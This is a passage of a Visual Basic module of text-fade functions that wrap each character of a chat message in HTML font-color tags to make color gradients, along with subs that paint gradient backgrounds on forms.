        c = Left(text, b)
        D = Right(c, 1)
        e = 255 / A
        f = e * b
        G = RGB(f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   BoldSendChat (Msg)

End Function

Function BoldBlackGreen(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 255 / A
        f = e * b
        G = RGB(0, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  BoldSendChat (Msg)
End Function

Function BoldBlackGrey(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 220 / A
        f = e * b
        G = RGB(f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   BoldSendChat (Msg)
End Function

Function BoldBlackPurple(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 255 / A
        f = e * b
        G = RGB(f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & h & ">" & D
    Next b
   SendChat (Msg)
End Function

Function BoldBlackRed(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 255 / A
        f = e * b
        G = RGB(0, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
BoldSendChat (Msg)
End Function

Function BoldBlackYellow(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 255 / A
        f = e * b
        G = RGB(0, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
BoldSendChat (Msg)
End Function

Function BoldBlueBlack(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 255 / A
        f = e * b
        G = RGB(255 - f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  BoldSendChat (Msg)
End Function

Function BoldBlueGreen(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 255 / A
        f = e * b
        G = RGB(255 - f, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
 BoldSendChat (Msg)
End Function

Function BoldBluePurple(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 255 / A
        f = e * b
        G = RGB(255, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  BoldSendChat (Msg)
End Function

Function BoldBlueRed(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 255 / A
        f = e * b
        G = RGB(255 - f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
 BoldSendChat (Msg)
End Function

Function BoldBlueYellow(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 255 / A
        f = e * b
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  BoldSendChat (Msg)
End Function

Function BoldGreenBlack(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 255 / A
        f = e * b
        G = RGB(0, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & h & ">" & D
    Next b
   SendChat (Msg)
End Function

Function BoldGreenBlue(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 255 / A
        f = e * b
        G = RGB(f, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & h & ">" & D
    Next b
   SendChat (Msg)
End Function

Function BoldGreenPurple(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 255 / A
        f = e * b
        G = RGB(f, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & h & ">" & D
    Next b
   SendChat (Msg)
End Function

Function BoldGreenRed(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 255 / A
        f = e * b
        G = RGB(0, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & h & ">" & D
    Next b
   SendChat (Msg)
End Function

Function BoldGreenYellow(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 255 / A
        f = e * b
        G = RGB(0, 255, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & h & ">" & D
    Next b
  SendChat (Msg)
End Function

Function BoldGreyBlack(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 220 / A
        f = e * b
        G = RGB(255 - f, 255 - f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
 BoldSendChat (Msg)
End Function

Function BoldGreyBlue(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 255 / A
        f = e * b
        G = RGB(255, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
BoldSendChat (Msg)
End Function

Function BoldGreyGreen(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 255 / A
        f = e * b
        G = RGB(255 - f, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
 BoldSendChat (Msg)
End Function

Function BoldGreyPurple(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 255 / A
        f = e * b
        G = RGB(255, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
 BoldSendChat (Msg)
End Function

Function BoldGreyRed(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 255 / A
        f = e * b
        G = RGB(255 - f, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
BoldSendChat (Msg)
End Function

Function BoldGreyYellow(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 255 / A
        f = e * b
        G = RGB(255 - f, 255, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
BoldSendChat (Msg)
End Function

Function BoldPurpleBlack(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 255 / A
        f = e * b
        G = RGB(255 - f, 0, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
BoldSendChat (Msg)
End Function

Function BoldPurpleBlue(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 255 / A
        f = e * b
        G = RGB(255, 0, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
 BoldSendChat (Msg)
End Function

Function BoldPurpleGreen(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 255 / A
        f = e * b
        G = RGB(255 - f, f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
BoldSendChat (Msg)
End Function

Function BoldPurpleRed(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 255 / A
        f = e * b
        G = RGB(255 - f, 0, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
BoldSendChat (Msg)
End Function

Function BoldPurpleYellow(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 255 / A
        f = e * b
        G = RGB(255 - f, f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
BoldSendChat (Msg)
End Function

Function BoldRedBlack(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 255 / A
        f = e * b
        G = RGB(0, 0, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & h & ">" & D
    Next b
   SendChat (Msg)
End Function

Function BoldRedBlue(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 255 / A
        f = e * b
        G = RGB(f, 0, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
End Function

Function BoldRedGreen(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 255 / A
        f = e * b
        G = RGB(0, f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
BoldSendChat (Msg)
End Function

Function BoldRedPurple(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 255 / A
        f = e * b
        G = RGB(f, 0, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
 BoldSendChat (Msg)
End Function

Function BoldRedYellow(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 255 / A
        f = e * b
        G = RGB(0, f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
BoldSendChat (Msg)
End Function

Function BoldYellowBlack(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 255 / A
        f = e * b
        G = RGB(0, 255 - f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  BoldSendChat (Msg)
End Function

Function BoldYellowBlue(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 255 / A
        f = e * b
        G = RGB(f, 255 - f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   SendChat (Msg)
End Function

Function BoldYellowGreen(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 255 / A
        f = e * b
        G = RGB(0, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   SendChat (Msg)
End Function

Function BoldYellowPurple(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 255 / A
        f = e * b
        G = RGB(f, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   SendChat (Msg)
End Function

Function BoldYellowRed(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 255 / A
        f = e * b
        G = RGB(0, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & h & ">" & D
    Next b
   SendChat (Msg)
End Function


'Pre-set 3 Color fade combinations begin here


Function BoldBlackBlueBlack2(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<B><U><Font Color=#" & h & ">" & D
    Next b
   SendChat (Msg)
End Function
Function BoldBlackBlueBlack(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   BoldSendChat (Msg)
End Function
Function BoldBlackGreenBlack(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   BoldSendChat (Msg)
End Function

Function BoldBlackGreyBlack(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 490 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   BoldSendChat (Msg)
End Function

Function Bolditalic_BlackPurpleBlack(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<B><I><Font Color=#" & h & ">" & D
    Next b
   SendChat (Msg)
End Function

Function BoldBlackRedBlack(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  BoldSendChat (Msg)
End Function

Function BoldBlackYellowBlack(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   BoldSendChat (Msg)
End Function

Function BoldBlueBlackBlue(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  BoldSendChat (Msg)
End Function

Function BoldBlueGreenBlue(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    SendChat Msg
End Function

Function Bolditalic_BluePurpleBlue(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<B><I><Font Color=#" & h & ">" & D
    Next b
 SendChat (Msg)
End Function

Function BoldBlueRedBlue(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
End Function

Function BoldBlueYellowBlue(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  BoldSendChat (Msg)
End Function

Function BoldGreenBlackGreen(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & h & ">" & D
    Next b
  SendChat (Msg)
End Function

Function BoldGreenBlueGreen(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & h & ">" & D
    Next b
   SendChat (Msg)
End Function

Function BoldGreenPurpleGreen(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & h & ">" & D
    Next b
  SendChat (Msg)
End Function

Function BoldGreenRedGreen(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & h & ">" & D
    Next b
   SendChat (Msg)
End Function


Function BoldGreenYellowGreen(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & h & ">" & D
    Next b
  SendChat (Msg)
End Function

Function BoldGreyBlackGrey(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 490 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
BoldSendChat (Msg)
End Function

Function BoldGreyBlueGrey(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 490 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
 BoldSendChat (Msg)
End Function

Function BoldGreyGreenGrey(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 490 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
BoldSendChat (Msg)
End Function

Function BoldGreyPurpleGrey(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 490 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
BoldSendChat (Msg)
End Function

Function BoldGreyRedGrey(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 490 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
BoldSendChat (Msg)
End Function

Function BoldGreyYellowGrey(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 490 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  BoldSendChat (Msg)
End Function

Function BoldPurpleBlackPurple(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & h & ">" & D
    Next b
BoldSendChat (Msg)
End Function

Function BoldPurpleBluePurple(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 0, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & h & ">" & D
    Next b
 BoldSendChat (Msg)
End Function

Function BoldPurpleGreenPurple(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & h & ">" & D
    Next b
 BoldSendChat (Msg)
End Function

Function BoldPurpleRedPurple(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
BoldSendChat (Msg)
End Function

Function BoldPurpleYellowPurple(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
 BoldSendChat (Msg)
End Function

Function RedBlackRed2(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 0, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<B><I><U><Font Color=#" & h & ">" & D
    Next b
  SendChat (Msg)
End Function
Function BoldRedBlackRed(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 0, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  BoldSendChat (Msg)
End Function
Function BoldRedBlueRed(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   BoldSendChat (Msg)
End Function

Function BoldRedGreenRed(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  BoldSendChat (Msg)
End Function

Function BoldRedPurpleRed(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
BoldSendChat (Msg)
End Function

Function BoldRedYellowRed(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  BoldSendChat (Msg)
End Function

Function BoldYellowBlackYellow(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   BoldSendChat (Msg)
End Function

Function BoldYellowBlueYellow(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  BoldSendChat (Msg)
End Function

Function BoldYellowGreenYellow(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   BoldSendChat (Msg)
End Function

Function BoldYellowPurpleYellow(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   BoldSendChat (Msg)
End Function

Function BoldYellowRedYellow(text As String)
    A = Len(text)
    For b = 1 To A
        c = Left(text, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   BoldSendChat (Msg)
End Function




'Form back color fade codes begin here
'Works best when used in the Form_Paint() sub


Sub FadeFormBlue(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(0, 0, 255 - intLoop), B
    Next intLoop
End Sub

Sub FadeFormGreen(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(0, 255 - intLoop, 0), B
    Next intLoop
End Sub

Sub FadeFormGrey(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 255 - intLoop, 255 - intLoop), B
    Next intLoop
End Sub

Sub FadeFormPurple(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 0, 255 - intLoop), B
    Next intLoop
End Sub

Sub FadeFormRed(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 0, 0), B
    Next intLoop
End Sub

Sub FadeFormYellow(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 255 - intLoop, 0), B
    Next intLoop
End Sub


'Variable color fade functions begin here


Function TwoColors(text, Red1, Green1, Blue1, Red2, Green2, Blue2, WavY As Boolean)
    C1BAK = c1
    C2BAK = c2
    C3BAK = c3
    C4BAK = c4
    c = 0
    O = 0
    o2 = 0
    Q = 1
    Q2 = 1
    For X = 1 To Len(text)
        BVAL1 = Red2 - Red1
        BVAL2 = Green2 - Green1
        BVAL3 = Blue2 - Blue1
        
        VAL1 = (BVAL1 / Len(text) * X) + Red1
        VAL2 = (BVAL2 / Len(text) * X) + Green1
        VAL3 = (BVAL3 / Len(text) * X) + Blue1
        
        c1 = RGB2HEX(VAL1, VAL2, VAL3)
        c2 = RGB2HEX(VAL1, VAL2, VAL3)
        c3 = RGB2HEX(VAL1, VAL2, VAL3)
        c4 = RGB2HEX(VAL1, VAL2, VAL3)
        
        If c1 = c2 And c2 = c3 And c3 = c4 And c4 = c1 Then c = 1: Msg = Msg & "<FONT COLOR=#" + c1 + ">"
        If o2 = 1 Then o2 = 2 Else If o2 = 2 Then o2 = 3 Else If o2 = 3 Then o2 = 4 Else o2 = 1
        
        If c <> 1 Then
            If o2 = 1 Then Msg = Msg + "<FONT COLOR=#" + c1 + ">"
            If o2 = 2 Then Msg = Msg + "<FONT COLOR=#" + c2 + ">"
            If o2 = 3 Then Msg = Msg + "<FONT COLOR=#" + c3 + ">"
            If o2 = 4 Then Msg = Msg + "<FONT COLOR=#" + c4 + ">"
        End If
        
        If WavY = True Then
            If o2 = 1 Then Msg = Msg + "<SUB>"
